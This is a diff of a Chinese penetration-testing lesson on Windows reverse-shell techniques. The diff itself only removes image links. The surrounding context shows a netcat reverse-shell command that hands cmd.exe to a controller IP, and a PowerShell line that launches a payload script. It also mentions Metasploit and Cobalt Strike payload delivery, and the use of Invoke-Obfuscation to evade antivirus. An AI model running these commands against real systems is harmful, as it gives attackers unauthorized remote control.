@@ -28,7 +28,6 @@
 
 ![](img/789fbd9667971d0bbdc47a1added5486_17.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_19.png)
 
 上节课我们编写了一个名为 `ftp.txt` 的脚本，并通过 `copy` 命令将其写入目标机器。然后使用以下语句自动下载文件：
 ```cmd
@@ -64,9 +63,7 @@ python3 -m pyftpdlib
 
 ![](img/789fbd9667971d0bbdc47a1added5486_29.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_31.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_33.png)
 
 在深入具体方法之前，我们需要理解两个核心概念：正向Shell和反向Shell。
 
@@ -111,9 +108,7 @@ python3 -m pyftpdlib
 
 **被控制端主动发起连接请求去连接控制端。**
 
-![](img/789fbd9667971d0bbdc47a1added5486_60.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_61.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_63.png)
 
@@ -125,43 +120,30 @@ python3 -m pyftpdlib
 ```
 **核心区别**：连接发起的方向相反。反向Shell是“被控端找控制端”，常用于穿透网络限制。
 
-![](img/789fbd9667971d0bbdc47a1added5486_65.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_67.png)
 
 ---
 
-![](img/789fbd9667971d0bbdc47a1added5486_69.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_71.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_73.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_75.png)
 
 ## 第二部分：Windows反弹Shell方法详解 🧰
 
 ![](img/789fbd9667971d0bbdc47a1added5486_77.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_79.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_81.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_83.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_85.png)
 
 理解了基本原理后，本节我们来看看在Windows系统上实现反弹Shell的多种具体方法。
 
-![](img/789fbd9667971d0bbdc47a1added5486_87.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_89.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_91.png)
 
 ### 方法一：使用 NC (Netcat)
 
-![](img/789fbd9667971d0bbdc47a1added5486_93.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_95.png)
 
@@ -175,17 +157,13 @@ python3 -m pyftpdlib
 
 ![](img/789fbd9667971d0bbdc47a1added5486_103.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_104.png)
 
 NC是一个网络工具中的“瑞士军刀”，常用于建立网络连接。
 
 ![](img/789fbd9667971d0bbdc47a1added5486_106.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_108.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_110.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_112.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_114.png)
 
@@ -214,21 +192,16 @@ nc [目标IP] 6666
 
 ![](img/789fbd9667971d0bbdc47a1added5486_122.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_124.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_126.png)
 
 #### 2. 反向Shell (使用NC)
 
-![](img/789fbd9667971d0bbdc47a1added5486_128.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_130.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_132.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_133.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_135.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_137.png)
 
@@ -239,11 +212,9 @@ nc [目标IP] 6666
 nc -lvp 54321
 ```
 
-![](img/789fbd9667971d0bbdc47a1added5486_141.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_143.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_145.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_146.png)
 
@@ -305,7 +276,6 @@ nc [控制端IP] 54321 -e cmd.exe
 6.  **获取Shell**：
     执行后，MSF的监听器会收到来自目标机器的反向连接，并建立一个Meterpreter会话。
 
-![](img/789fbd9667971d0bbdc47a1added5486_160.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_161.png)
 
@@ -315,7 +285,6 @@ nc [控制端IP] 54321 -e cmd.exe
 
 ![](img/789fbd9667971d0bbdc47a1added5486_165.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_166.png)
 
 #### 方式2：使用Cobalt Strike生成HTA文件
 
@@ -333,9 +302,7 @@ nc [控制端IP] 54321 -e cmd.exe
 
 ![](img/789fbd9667971d0bbdc47a1added5486_171.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_172.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_174.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_175.png)
 
@@ -347,11 +314,8 @@ nc [控制端IP] 54321 -e cmd.exe
 
 ---
 
-![](img/789fbd9667971d0bbdc47a1added5486_179.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_180.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_181.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_182.png)
 
@@ -363,13 +327,11 @@ nc [控制端IP] 54321 -e cmd.exe
 
 ![](img/789fbd9667971d0bbdc47a1added5486_187.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_189.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_190.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_192.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_194.png)
 
 ### 方法三：利用 Rundll32 执行远程DLL文件
 
@@ -416,13 +378,11 @@ nc [控制端IP] 54321 -e cmd.exe
 
 ![](img/789fbd9667971d0bbdc47a1added5486_214.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_216.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_218.png)
 
 #### 方式2：手动生成DLL并执行
 
-![](img/789fbd9667971d0bbdc47a1added5486_220.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_222.png)
 
@@ -450,15 +410,12 @@ nc [控制端IP] 54321 -e cmd.exe
     exploit
     ```
 
-![](img/789fbd9667971d0bbdc47a1added5486_230.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_232.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_234.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_236.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_238.png)
 
 ---
 
@@ -466,9 +423,7 @@ nc [控制端IP] 54321 -e cmd.exe
 
 ![](img/789fbd9667971d0bbdc47a1added5486_241.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_243.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_244.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_246.png)
 
@@ -484,7 +439,6 @@ nc [控制端IP] 54321 -e cmd.exe
 
 ![](img/789fbd9667971d0bbdc47a1added5486_253.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_255.png)
 
 #### 使用MSF的 `exploit/windows/misc/regsvr32_applocker_bypass_server` 模块
 
@@ -522,15 +476,11 @@ nc [控制端IP] 54321 -e cmd.exe
 
 ---
 
-![](img/789fbd9667971d0bbdc47a1added5486_275.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_276.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_277.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_279.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_280.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_281.png)
 
@@ -550,11 +500,8 @@ nc [控制端IP] 54321 -e cmd.exe
 
 ![](img/789fbd9667971d0bbdc47a1added5486_293.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_295.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_297.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_299.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_301.png)
 
@@ -571,19 +518,14 @@ nc [控制端IP] 54321 -e cmd.exe
 
 ---
 
-![](img/789fbd9667971d0bbdc47a1added5486_303.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_305.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_307.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_309.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_310.png)
 
 ### 方法六：利用 PowerShell 的强大功能
 
-![](img/789fbd9667971d0bbdc47a1added5486_312.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_314.png)
 
@@ -609,13 +551,11 @@ PowerShell是Windows上功能强大的脚本语言和命令行工具。
 
 #### 方式1：使用 PowerCat (PowerShell版的NC)
 
-![](img/789fbd9667971d0bbdc47a1added5486_333.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_335.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_337.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_339.png)
 
 1.  **下载PowerCat脚本**，并在攻击机启动Web服务托管它。
 2.  **在攻击机用NC监听端口**：
@@ -631,7 +571,6 @@ PowerShell是Windows上功能强大的脚本语言和命令行工具。
 
 ![](img/789fbd9667971d0bbdc47a1added5486_341.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_343.png)
 
 #### 方式2：使用MSF的 `web_delivery` 模块 (PSH目标)
 
@@ -639,9 +578,7 @@ PowerShell是Windows上功能强大的脚本语言和命令行工具。
 
 ![](img/789fbd9667971d0bbdc47a1added5486_347.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_349.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_351.png)
 
 1.  **加载模块并配置为PowerShell目标**：
     ```bash
@@ -663,7 +600,6 @@ PowerShell是Windows上功能强大的脚本语言和命令行工具。
 $p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cscript.exe';$p.StartInfo.Arguments='C:\Windows\Temp\payload.vbs';$p.Start()
 ```
 
-![](img/789fbd9667971d0bbdc47a1added5486_355.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_357.png)
 
@@ -675,13 +611,11 @@ $p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cscript.exe';$p.
 
 ---
 
-![](img/789fbd9667971d0bbdc47a1added5486_365.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_367.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_369.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_371.png)
 
 ### 方法七：利用 Msiexec 执行远程MSI安装包
 
@@ -751,9 +685,7 @@ $p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cscript.exe';$p.
 
 ### 方法八：生成EXE文件并配合PowerShell执行
 
-![](img/789fbd9667971d0bbdc47a1added5486_412.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_414.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_415.png)
 
@@ -779,7 +711,6 @@ $p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cscript.exe';$p.
 
 ![](img/789fbd9667971d0bbdc47a1added5486_423.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_425.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_427.png)
 
@@ -795,11 +726,9 @@ $p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cscript.exe';$p.
 
 ![](img/789fbd9667971d0bbdc47a1added5486_435.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_437.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_439.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_441.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_443.png)
 
@@ -809,29 +738,23 @@ $p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cscript.exe';$p.
 
 直接使用上述PowerShell命令容易被杀毒软件检测。可以使用混淆工具来绕过。
 
-![](img/789fbd9667971d0bbdc47a1added5486_449.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_450.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_452.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_453.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_455.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_456.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_458.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_460.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_462.png)
 
 一个强大的工具是 **Invoke-Obfuscation**。
 
-![](img/789fbd9667971d0bbdc47a1added5486_463.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_464.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_465.png)
 
@@ -882,7 +805,6 @@ $p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cscript.exe';$p.
 
 ![](img/789fbd9667971d0bbdc47a1added5486_486.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_488.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_490.png)
 
@@ -898,7 +820,6 @@ $p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cscript.exe';$p.
 
 ![](img/789fbd9667971d0bbdc47a1added5486_499.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_501.png)
 
 ---
 
@@ -918,9 +839,7 @@ $p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cscript.exe';$p.
 
 ![](img/789fbd9667971d0bbdc47a1added5486_515.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_517.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_519.png)
 
 ![](img/789fbd9667971d0bbdc47a1added5486_521.png)
 
@@ -948,7 +867,6 @@ $p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cscript.exe';$p.
 
 ![](img/789fbd9667971d0bbdc47a1added5486_541.png)
 
-![](img/789fbd9667971d0bbdc47a1added5486_543.png)
 
 ### 课程总结
 
